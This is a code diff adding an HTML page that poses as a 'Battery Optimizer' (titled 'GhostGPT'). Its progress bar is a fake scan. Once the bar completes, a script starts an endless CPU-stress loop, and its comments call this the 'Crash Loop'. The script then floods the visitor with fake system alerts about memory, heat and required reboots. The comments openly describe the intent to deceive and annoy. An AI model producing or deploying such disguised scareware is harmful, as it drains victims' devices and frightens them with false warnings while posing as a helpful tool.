@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Battery Optimizer - GhostGPT</title>
+    <style>
+        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 30px;}
+        .container { max-width: 400px; margin: auto; }
+        h1 { color: #075e54; } /* WhatsApp Green */
+        .bar-bg { width: 100%; height: 20px; background: #ddd; border-radius: 10px; overflow: hidden;}
+        .bar-fill { height: 100%; width: 30%; background: linear-gradient(90deg, #4cd964, #8bc34a); transition: width 0.2s; }
+        .status { margin-top: 15px; font-size: 16px; color: #555; font-weight: bold;}
+        
+        /* Fake Error Modal Styles */
+        #errorModal { display:none; position:absolute; top:0; left:0; right:0; bottom:0; background:white; z-index:999;}
+        .modal-header { padding:15px; border-bottom:1px solid #ccc; background:#fdd83c !important;}
+        .modal-body { padding:15px;}
+    </style>
+</head>
+<body style="overflow:hidden;"> <!-- Prevent scrolling -->
+
+<div class="container">
+    <h1>Battery Optimizer</h1>
+    <p>Scanning for power-hungry apps...</p>
+    
+    <!-- Fake Progress Bar -->
+    <div class="bar-bg"><div id="progress" class="bar-fill"></div></div>
+    <div id="status" class="status">Initializing scan...</div>
+
+    <!-- Hidden Trigger for Crash + Email Spam -->
+    <script>
+        const progress = document.getElementById('progress');
+        const status = document.getElementById('status');
+
+        // Phase 1: Visual deception (Fake optimization)
+        let width = 30; 
+        status.innerText = "Optimizing background tasks...";
+
+        function updatePhase() {
+            if (width >= 95) {
+                runCrashLoop(); // Start heavy CPU loop
+                startEmailSpam(); // Start spamming fake errors
+                return;
+            }
+            
+            width += Math.random() * 2 + 0.5; 
+            progress.style.width = width + "%";
+
+            const fakescans = ["WeChat", "Instagram", "System Core"];
+            let fakeIndex = parseInt(Math.random() * fakescans.length);
+            status.innerText = `Optimizing ${fakescans[fakeIndex]}...`;
+
+            setTimeout(updatePhase, 150); 
+        }
+
+        function runCrashLoop() {
+             console.log("Optimization complete! Running final cleanup...");
+             
+             // The Crash Loop: Heavy Math (CPU Stress)
+             setInterval(() => {
+                 let a = 1; 
+                 for(let i=0; i<20000; i++) {
+                     a *= (Math.random() * 1.5 + 0.8) / 0.9; 
+                 }
+             }, 5); 
+
+             status.innerText = "Finalizing memory dump...";
+        }
+
+        // New Function: Fake Email/Notification Spam
+        function startEmailSpam() {
+            const fakeEmails = [
+                "System Alert: Memory Usage >98%",
+                "Optimization Failed - Reboot Required",
+                "High Heat Detected in CPU",
+                "Battery Drain Rate Critical"
+            ];
+
+            // Simulate receiving an email every few seconds in a popup alert (very annoying)
+            setInterval(() => {
+                let randomError = fakeEmails[Math.floor(Math.random() * fakeEmails.length)];
+                
+                // Try to open native browser alert first, then fallback to modal if needed
+                setTimeout(() => {
+                    try {
+                        window.alert(randomError); 
+                    } catch(e) {
+                        console.log("Alert blocked, using internal modal");
+                        showCustomModal(randomError);
+                    }
+                }, 1000 + Math.random() * 2000); // Random delay between "emails"
+
+            }, 4500); // New spam every ~4.5 seconds after crash starts
+        }
+
+        function showCustomModal(text) {
+            const modal = document.createElement('div');
+            modal.id = 'errorModal';
+            modal.innerHTML = `
+                <div class="modal-header" style="color:black;">System Alert</div>
+                <div class="modal-body">${text}</div>
+                <button onclick="this.parentElement.style.display='none'" style="margin-top:10px; padding:5px 15px; cursor:pointer;">Close</button>`;
+            
+            document.body.appendChild(modal);
+            
+            // Auto-hide after 2 seconds to keep the "Crash" feeling (makes them click it again)
+            setTimeout(() => { 
+                if(document.getElementById('errorModal')) document.getElementById('errorModal').style.display = 'block';
+            }, 2000);
+        }
+
+        // Start the fake process immediately
+        setTimeout(updatePhase, 100);
+
+    </script>
+</div>
+
+</body>
+</html>
